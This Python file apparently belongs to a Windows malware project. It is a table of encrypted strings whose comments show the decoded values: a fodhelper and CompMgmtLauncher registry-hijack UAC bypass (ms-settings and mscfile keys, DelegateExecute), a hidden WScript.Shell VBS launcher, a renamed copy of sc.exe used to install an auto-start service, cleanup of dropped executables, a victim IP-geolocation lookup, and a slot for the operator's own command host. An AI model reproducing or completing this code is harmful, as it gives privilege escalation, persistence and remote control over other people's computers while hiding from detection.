#coding:utf-8
import Crypt

def get(key):
    res = {
        #C:\ProgramData\
        '1':'H4sIAHW2b14C/3N0qoq0SNJW84w3qE6wSXZJC7MrNCpODvNwt1a0sIx3inTSUtMwVQ4qzw7M9C+pLfSNK/Vyy89PSszRzjZ2UHVJKKsLdc4I8bGsSbGp9QvWMjAwAAAPoHANUwAAAA==',
        #.exe
        '2':'H4sIAOK7b14C/3N0qoq0sLY1c/IzqE6wSXZJC7MrjE/O0TJ1t1a0LIyrUskI9rcPKNF0iPB3dTapCTKoNSgu80+xcPfMcTIwMAAAODe3Yj8AAAA=',
        #CreateObject("WScript.Shell").Run "{}",0,FALSE
        '3':'H4sIAIm8b14C/3N0qoq0yPTVUPU2qE6wSXZJC7MrVNWIqK1xt1a0sIx39FEx8IhMN3U3zlaOK3YzD0+pTAz2sVWucEyPilLz1XRQTfK1yypQy8g3TIyzDPOpdvUwNPSIsyy3NHKvqvOtctAwic8wKqryKsmw1lB0d7fLTS1RLTI0CjMorlLMqDQLCq81MDAAAJtFnwiFAAAA',
        #.vbs
        '4':'H4sIACm9b14C/3N0qoq0cInyL3U0qE6wSXZJC7O1VEsyDjF2t1a0LIxLLUzMVa3U9MtNMvJNsC6ri3S2MSgu1/S0MIs0MTEwMAAAgZsjAj8AAAA=',
        #Classes\mscfile\shell\open\command
        '5':'H4sIABzAb14C/3N0qoq0sPROSTcwqE6wSXZJC7O1LFaLVNN2t1a0sDTRNKsLdtUtLy/0MEzVLvUo9c10dTMvyPZyV4kLSlLLyDeKV7U1jyhXySvP9FDJUysMc1OMitJwLahzLVJ1M9E18jcuyqw0KK5ws/ZTywyqNDAwAABZRQtucQAAAA==',
        #wscript
        '6':'H4sIAGbAb14C/3N0qoq0iDAyDbY1qE6wSXZJC7O1DMiKcFJxt1a0zHR1TwjO8TAyrlRW88xP8UoKjgrR9A+ss8sz9I9S9DDwNUr0yMsOd/E3MAAA3dzjCEgAAAA=',
        #CompMgmtLauncher.exe
        '7':'H4sIAN7Ab14C/3N0qoq00M0PNvU3qE6wSXZJC7MrdM+qy0xzt1a0sDTRdC43cVdND3Qvzw6P0FBNCHVxdFX1T6/2CKvyLHCvCFGtTkp0UXRWLVIpUDP0j1L0MPApyPFyqla1szAwAAB3KHpjXAAAAA==',
        #C:\Windows\System32\fodhelper.exe
        '8':'H4sIAFrBb14C/3N0qoq0CHENcVI2qE6wSXZJC7O1dKl28Al0t1a0sIx3inTSUsv2KbdzVQ3P8dJMcrCodFc1dQlVy6gq9vNTDUrXctWoSFFVcw9I8ffXzPeJcNVNjcg1MQiszXJ3jVCxTEpMrdQK8TFyyy4IdIwvNjAwAADT6IaycQAAAA==',
        #Software\Classes\ms-settings\shell\open\command
        '9':'H4sIAInBb14C/3N0qoq0yPQLdgwwqE6wSXZJC7MrVK0MjfB0t1a0MHSLjKvKc3VP8HIuycvOtHdIck6oc9UtLy/0MEzVLvUI00rR8jAPN7VRyyjKSNNMqi729ChNcolSy3BwTy7XdC4tdU3SUrTWMi/IiSr1ck4MSco3cbOND0u1s0j2CavNDvEx8izU8DOITzEwMAAAoWz3JYoAAAA=',
        #DelegateExecute
        '10':'H4sIAK3Bb14C/3N0qoq0KNHVjK8yqE6wSXZJC7Mr9EjXrUhzt1a0sIwPS/a3VXO3cA8ryUvTzfMwLHJX9IjMT4gwMQgvcYpzSTGKLKsLdc4I8THz0MoODrRRNjAwAAB75H3sUwAAAA==',
        #C:\Windows\System32\cmd.exe
        '11':'H4sIAMXBb14C/3N0qoq0UM5JSTMwqE6wSXZJC7MrzEpOSE9yt1a0sIx3inTSUsv2KbdzVQ3P8dJMcrCodFc1dQlVy6gq9vNTDUrX8igNt/F0zXTxzzExiPLw97DWyvJxMQipig/xMay1MctW8XEyMDAAANmq+QVnAAAA',
        #Software\Classes\ms-settings\shell\open
        '13':'H4sIAJZscF4C/3N0qoq0yA2JzEwxqE6wSXZJC7MrzIzMDE90z4qsM3CLjKvKc3VP8HIuycvOtHdIck6oc9UtLy/0MEzVLvUI00rR8jAPN7VRyyjKSNNMqi729ChNcolSy3BwTy7XdC5xicuN0FBMVMuqDfLP1c4ODfExCTMsVzGpyDAwMAAAuqkg/3sAAAA=',
        #command
        '14':'H4sIAMVscF4C/3N0qoq0UE6OyDA0qE6wSXZJC7MrNPFSda9xz4qss3BxUSlJc1OMitJwLahzdzLOq3Y39qgN0LU2KK6wzor0TPB0NDAwAADJ+AEORAAAAA==',
        #这里自己配置你的host然后调用Crypt模块的加密函数加密，如: http://baidu.com
        '15':'',
        #del %temp%\{}.exe
        '16':'H4sIAKbmcF4C/3N0qoq0KCrOtDY3qE6wSXZJC7MrDAhKCch3z4qss3BxyQ5MTKxJKExRc4/M8k7yTXAscVd0q8lxrwhRrU4KcEpJcMkPLrdO8o8qzQjxMUnPMTFWLskwMDAAAFH1zYdYAAAA',
        #copy c:\windows\system32\sc.exe %temp%\{}.exe
        '17':'H4sIAN/mcF4C/3N0qoq00K2usFMxqE6wSXZJC7Mr1DSLVPF0z4qss3Bx0XDTUvXJz8vyU42qytYyLyiuUgnWMAt20zTMcnD1MElx9ohK0khRyzfKyc0MzrIwVbX3qjTM8ii0iTJ2TlIJdy2IcgpISg+39PPzKLCLSvKPKs0I8XF0qdHILDNQMTAwAAB0+/WQgAAAAA==',
        #%temp%\{}.exe create "{}" binpath= "{}"  start= auto
        '18':'H4sIABLncF4C/3N0qoq0MDNL8go1qE6wSXZJC7O1jDMqyU5zz4qss4hLLQxP9IhMc7BwVzVzMDN218rPVbX3qjTyKA3L1ij1slBzTDIsMNIwcjDxDXBV9cu19/MwcQpJ1DDUcDHOTKr1ckjScPdxTa2LT3UzT/EITM4JrjQuNlA28zf0j1L0MHCPsrBRTCk3CzMwAACHH5uKiQAAAA==',
        #http://pv.sohu.com/cityjson?ie=utf-8
        '19':'H4sIAG8Tcl4C/3N0qoq0iKpIdak1qE6wSXZJC7O1LNf2zstys1PVyHOx1M2pUfPNqDXzy/QvdolzCa2xK1eOjPB3VQ11yza2NTMqKgkuDLRxM8/1MDbRLk71MEpQLctTtc+pcUpKjPRwdA2sS3Q2rPN1DY4ysg9Ndwqwy9A2MDAAAH7g6592AAAA',
        }[key]
    return Crypt.decrypt(res)